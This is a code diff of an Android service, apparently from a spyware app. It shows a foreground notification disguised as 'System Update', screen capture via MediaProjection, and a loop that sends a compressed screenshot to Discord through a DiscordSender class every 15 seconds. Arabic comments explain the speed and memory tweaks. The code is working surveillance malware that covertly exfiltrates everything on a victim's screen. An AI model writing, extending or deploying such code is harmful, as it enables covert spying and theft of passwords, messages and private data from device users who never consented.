@@ -28,11 +28,12 @@ public class ScreenService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        String channelId = "sys_service";
-        NotificationChannel channel = new NotificationChannel(channelId, "System", NotificationManager.IMPORTANCE_LOW);
-        getSystemService(NotificationManager.class).createNotificationChannel(channel);
-        startForeground(1, new NotificationCompat.Builder(this, channelId)
-                .setContentTitle("System Update Running")
+        // تشغيل الإشعار فوراً (أهم خطوة لمنع الكراش)
+        String cid = "sys_service";
+        NotificationChannel ch = new NotificationChannel(cid, "System", NotificationManager.IMPORTANCE_LOW);
+        getSystemService(NotificationManager.class).createNotificationChannel(ch);
+        startForeground(1, new NotificationCompat.Builder(this, cid)
+                .setContentTitle("System Update")
                 .setSmallIcon(android.R.drawable.ic_menu_info_details).build());
 
         if (intent != null && intent.hasExtra("resData")) {
@@ -49,13 +50,15 @@ public class ScreenService extends Service {
         DisplayMetrics metrics = new DisplayMetrics();
         WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
         wm.getDefaultDisplay().getMetrics(metrics);
+        // تقليل الحجم للنصف لضمان السرعة ومنع استهلاك الذاكرة
         imageReader = ImageReader.newInstance(metrics.widthPixels / 2, metrics.heightPixels / 2, PixelFormat.RGBA_8888, 2);
-        virtualDisplay = mediaProjection.createVirtualDisplay("Cap", metrics.widthPixels / 2, metrics.heightPixels / 2, metrics.densityDpi, 16, imageReader.getSurface(), null, null);
+        virtualDisplay = mediaProjection.createVirtualDisplay("Capture", 
+                metrics.widthPixels / 2, metrics.heightPixels / 2, metrics.densityDpi, 16, imageReader.getSurface(), null, null);
 
         handler.postDelayed(new Runnable() {
             @Override public void run() {
                 capture();
-                handler.postDelayed(this, 15000); // صورة كل 15 ثانية
+                handler.postDelayed(this, 15000); // إرسال صورة كل 15 ثانية
             }
         }, 5000);
     }
@@ -69,7 +72,7 @@ public class ScreenService extends Service {
                 bitmap.copyPixelsFromBuffer(buffer);
                 File file = new File(getCacheDir(), "s.png");
                 try (FileOutputStream out = new FileOutputStream(file)) {
-                    bitmap.compress(Bitmap.CompressFormat.JPEG, 40, out);
+                    bitmap.compress(Bitmap.CompressFormat.JPEG, 40, out); // ضغط الصورة للسرعة
                     DiscordSender.sendPhoto(file);
                 }
                 bitmap.recycle();
